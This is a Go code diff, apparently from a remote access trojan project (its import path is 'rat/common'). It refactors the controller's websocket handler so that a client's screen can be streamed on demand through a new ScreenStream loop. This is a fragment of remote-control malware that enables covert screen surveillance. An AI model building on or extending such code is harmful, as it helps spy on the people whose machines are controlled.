@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"rat/common"
 	"time"
 
 	"golang.org/x/net/websocket"
@@ -43,18 +44,14 @@ func incomingWebSocket(ws *websocket.Conn) {
 		client := get(event.ClientId)
 
 		if event.Event == ScreenUpdateEvent {
-			go func() {
-				for {
-					event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())
+			stream := event.Data == "true"
+			packet := ScreenPacket{stream}
+			client.Queue <- packet
 
-					err := websocket.JSON.Send(ws, &event)
-
-					if err != nil {
-						fmt.Println(err.Error())
-						return
-					}
-					time.Sleep(time.Millisecond * 200)
-				}
+			client.StreamingScreen = stream
+			go ScreenStream(client, ws)
+			defer func() {
+				client.StreamingScreen = false
 			}()
 		}
 	}
@@ -62,4 +59,20 @@ func incomingWebSocket(ws *websocket.Conn) {
 
 func InitControlSocket() {
 	http.Handle("/control", websocket.Handler(incomingWebSocket))
+}
+
+// ScreenStream streams screen to websocket
+func ScreenStream(client *Client, ws *websocket.Conn) {
+	for client.StreamingScreen {
+		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())
+
+		err := websocket.JSON.Send(ws, &event)
+
+		if err != nil {
+			fmt.Println("screenstream:", err.Error())
+			return
+		}
+
+		time.Sleep(common.ScreenStreamWait)
+	}
 }
